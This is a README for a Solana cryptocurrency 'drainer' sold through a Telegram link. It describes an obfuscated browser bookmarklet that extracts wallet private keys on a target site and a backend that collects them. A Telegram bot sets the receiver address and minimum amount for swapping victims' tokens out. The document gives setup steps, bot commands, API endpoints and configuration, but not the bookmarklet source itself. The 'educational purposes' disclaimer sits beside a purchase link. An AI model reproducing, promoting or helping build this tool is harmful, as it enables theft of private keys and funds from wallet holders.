# 🔐 Solana\Axiom drainer bookmark Wallet

A comprehensive automation system for Solana wallet management, featuring a bookmarklet for key extraction, a Telegram bot for remote control, and automated token swapping capabilities.

![Без имени-1](https://github.com/user-attachments/assets/d77495d7-679f-488d-836c-f2f0e9730668)


## 🌟 Features

- **🔑 Automated Key Extraction**: Browser bookmarklet for seamless private key extraction
- **🤖 Telegram Bot Integration**: Remote control and monitoring via Telegram
- **💱 Token Swapping**: Automatic token exchange functionality
- **🔒 Secure Encryption**: Advanced encryption and obfuscation techniques
- **📊 Real-time Monitoring**: Live transaction tracking and notifications
- **⚡ High Performance**: Optimized for speed and reliability

## 🏗️ Architecture

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Browser       │    │   Backend       │    │   Telegram Bot  │
│   Bookmarklet    │◄──►│   Server        │◄──►│   Controller    │
│                 │    │                 │    │                 │
└─────────────────┘    └─────────────────┘    └─────────────────┘
         │                       │                       │
         ▼                       ▼                       ▼
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Key           │    │   Wallet        │    │   Notification  │
│   Extraction    │    │   Service       │    │   System        │
└─────────────────┘    └─────────────────┘    └─────────────────┘
```

## 🚀 Quick Start

### Prerequisites

- Node.js (v16 or higher)
- npm or yarn
- Telegram Bot Token
- Solana RPC endpoint

### Installation

1. **Clone the repository**
   ```bash
   git clone https://github.com/yourusername/solana-wallet-automation.git
   cd solana-wallet-automation
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Configure environment variables**
   ```bash
   cp .env.example .env
   ```
   
   Edit `.env` file:
   ```env
   TELEGRAM_BOT_TOKEN=your_telegram_bot_token
   TELEGRAM_CHAT_ID=your_chat_id
   SOLANA_RPC_URL=https://api.mainnet-beta.solana.com
   PORT=3000
   ```

4. **Build the project**
   ```bash
   npm run build
   ```

5. **Start the server**
   ```bash
   npm start
   ```

## 📖 Usage

### Bookmarklet Setup

1. **Generate bookmarklet code** via Telegram bot:
   ```
   /compile https://your-domain.com
   ```

2. **Install the bookmarklet** in your browser:
   - Copy the generated JavaScript code
   - Create a new bookmark in your browser
   - Paste the code as the URL
   - Save the bookmark

3. **Execute the bookmarklet** on the target website to extract wallet keys

### Telegram Bot Commands

| Command | Description | Example |
|---------|-------------|---------|
| `/compile <url>` | Generate bookmarklet for domain | `/compile https://example.com` |
| `/setreceiver <address>` | Set receiver address | `/setreceiver 123456789...` |
| `/receiver` | Show current receiver address | `/receiver` |
| `/setminimum <amount>` | Set minimum USD amount | `/setminimum 100` |
| `/minimum` | Show current minimum amount | `/minimum` |
| `/info` | Show available commands | `/info` |

## 🔧 Configuration

### Bookmarklet Configuration

The system supports multiple domain configurations stored in `bookmarkletConfig.json`:

```json
{
  "domains": {
    "example.com": {
      "receiver": "wallet_address",
      "minimum": 100,
      "active": true
    }
  }
}
```

### API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/collect` | GET | Collect extracted wallet data |
| `/api/bookmarklet-params` | GET/POST | Manage bookmarklet parameters |
| `/api/bookmarklet-domains` | GET | Get all domain configurations |
| `/api/bookmarklet/receiver` | GET | Get receiver address |
| `/api/bookmarklet/log` | POST | Log bookmarklet activity |

## 🛠️ Development

### Project Structure

```
├── src/
│   ├── controllers/     # Request handlers
│   ├── middleware/      # Express middleware
│   ├── routes/          # API routes
│   ├── services/        # Business logic
│   ├── types/           # TypeScript types
│   ├── app.ts          # Express app setup
│   └── server.ts       # Server entry point
├── keys/               # Key management
├── public/             # Static files
├── bot.js             # Telegram bot
├── axiom-bookmarklet.txt # Bookmarklet source
└── package.json       # Dependencies
```
### Key Technologies

- **Backend**: Node.js, Express.js, TypeScript
- **Blockchain**: Solana Web3.js, BIP39, Ed25519
- **Bot**: node-telegram-bot-api
- **Security**: Helmet, CORS, encryption
- **Build**: Terser, JavaScript Obfuscator

## 🔒 Security Features

- **Obfuscation**: Advanced JavaScript obfuscation for bookmarklet
- **Encryption**: Secure key derivation and storage
- **Validation**: Input validation and sanitization
- **Rate Limiting**: Protection against abuse
- **CORS**: Cross-origin resource sharing protection

## 📊 Monitoring & Logging

The system provides comprehensive monitoring:

- **Real-time notifications** via Telegram
- **Transaction logging** with timestamps
- **Error tracking** and reporting
- **Performance metrics** collection

## ⚠️ Disclaimer

This software is for educational and research purposes only. Users are responsible for complying with all applicable laws and regulations. The authors are not liable for any misuse of this software.

## 🆘 Support


- Check the ([Telegram for buy](https://t.me/Bmyatina)) page


---

**⭐ Star this repository if you find it useful!** 
